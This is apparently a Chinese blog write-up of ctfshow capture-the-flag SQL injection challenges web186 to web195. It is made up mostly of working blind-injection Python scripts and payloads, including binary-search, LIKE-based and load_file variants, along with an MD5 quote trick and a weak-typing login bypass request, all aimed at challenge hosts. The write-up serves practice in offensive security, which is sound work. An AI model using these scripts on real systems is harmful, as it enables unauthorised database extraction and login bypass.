class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://50a0761d-8695-48df-bfe5-9410e5169332.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;ctfshow_user a inner join ctfshow_user b on b.pass like(concat(&#123;&#125;))&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStrNum</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&#x27;chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(c[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&#x27;,chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uuid = string.ascii_lowercase + string.digits + <span class="string">&quot;-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:</span><br><span class="line">        poc = payload.<span class="built_in">format</span>(createStrNum(target + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        <span class="comment"># print(poc)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: poc</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250430-125528.jpg" alt="1"></p>
<p>这不就把<code>&#39;</code>变出来了<code>ffifdyop</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6�]��!r,��b&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>弱类型转换，一般id为0或者1的用户为admin，密码fuzz一下是0</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>bb3afd2b-ab85-40c7-aad1-7804d184482a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>21</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;135&quot;, &quot;Not-A.Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;135&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://bb3afd2b-ab85-40c7-aad1-7804d184482a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://bb3afd2b-ab85-40c7-aad1-7804d184482a.challenge.ctf.show/select-waf.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=<span class="number">0</span>&amp;password=<span class="number">0</span></span></span><br></pre></td></tr></table></figure>

<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>利用<code>load_file</code>进行盲注，因为我们是找flag，所以直接正则匹配，写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b412e013-0ef3-4426-a54b-c77bc2ff1648.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">uuid = string.digits+string.ascii_lowercase+<span class="string">&quot;-&#125;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> uuid:</span><br><span class="line">        payload = <span class="string">&quot;if((load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;0&#125;&#x27;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment"># print(char)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : payload.<span class="built_in">format</span>(target+char),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u67e5\\u8be2\\u5931\\u8d25&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += char</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<p>写了一会，发现url没换，绷不住了</p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>Sql语句直接对参数进行拼接，直接打盲注，写Sql语句注意括号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://65067a4c-0f8b-4d9d-89ea-dc1ab6362ee3.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span> &lt;tail:</span><br><span class="line">        mid=(tail+head)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># payload=&quot;admin&#x27;and (ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id, f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                 i, mid)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<p>这个脚本写了特别久，因为每次注出来之后他就不往里面加，陷入了一个死循环，后面我把第二个while的条件改了一下才出来的，真得<strong>随机应变</strong>啊</p>
<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>用ord绕过，整个数据库都没变</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d50e11ca-112a-4b1c-bb8f-6ff147554e84.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span> &lt;tail:</span><br><span class="line">        mid=(tail+head)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># payload=&quot;admin&#x27;and (ord(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ord(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id, f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;0&#125;,1))&lt;&#123;1&#125;)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                 i, mid)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>没有ord了，用<code>chr</code>来绕过，只不过好像需要小写字符，而且因为是二分法，<code>_</code>的ascii字符是<code>95</code>，就很容易跳过，不过自己手动换一下就好了，如果硬要识别出来就要遍历了，那样子不够快</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二分法</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e3ca5daa-7fec-4bfa-9d2f-7282f1dbda31.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span> &lt;tail:</span><br><span class="line">        mid=(tail+head)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># payload=&quot;admin&#x27;and ((substr((select database()),&#123;0&#125;,1))&lt;chr(&#123;1&#125;))#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;0&#125;,1))&lt;chr(&#123;1&#125;))#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;0&#125;,1))&lt;chr(&#123;1&#125;))#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id, f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;0&#125;,1))&lt;chr(&#123;1&#125;))#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                 i, mid)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target.lower())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e3ca5daa-7fec-4bfa-9d2f-7282f1dbda31.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(head,tail):</span><br><span class="line">        payload=<span class="string">&quot;admin&#x27;and ((substr((select database()),&#123;0&#125;,1))=chr(&#123;1&#125;))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;0&#125;,1))=chr(&#123;1&#125;))#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, j)</span></span><br><span class="line">        <span class="comment"># ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;0&#125;,1))=chr(&#123;1&#125;))#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, j)</span></span><br><span class="line">        <span class="comment"># id, f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;0&#125;,1))=chr(&#123;1&#125;))#&quot;.format(</span></span><br><span class="line">        <span class="comment">#          i, j)</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(target.lower())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web193-194"><a href="#web193-194" class="headerlink" title="web193\194"></a>web193\194</h2><p><code>substr</code>被过滤了，<code>like</code>和<code>%</code>来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://93cacefa-296a-4488-87b6-4d9960e2804a.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">target=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-,&#123;&#125;_&#x27;</span>:</span><br><span class="line">        <span class="comment"># payload=&quot;admin&#x27;and (select database())like &#x27;&#123;&#125;&#x27;#&quot;.format(target+j+&#x27;%&#x27;)</span></span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;)like &#x27;&#123;&#125;&#x27;#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     target + j + &#x27;%&#x27;)</span></span><br><span class="line">        <span class="comment"># ctfshow_flxg,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;)like &#x27;&#123;&#125;&#x27;#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     target + j + &#x27;%&#x27;)</span></span><br><span class="line">        <span class="comment"># id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (select f1ag from ctfshow_flxg)like &#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            target + j + <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target+=j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>直接闭合打堆叠注入</p>
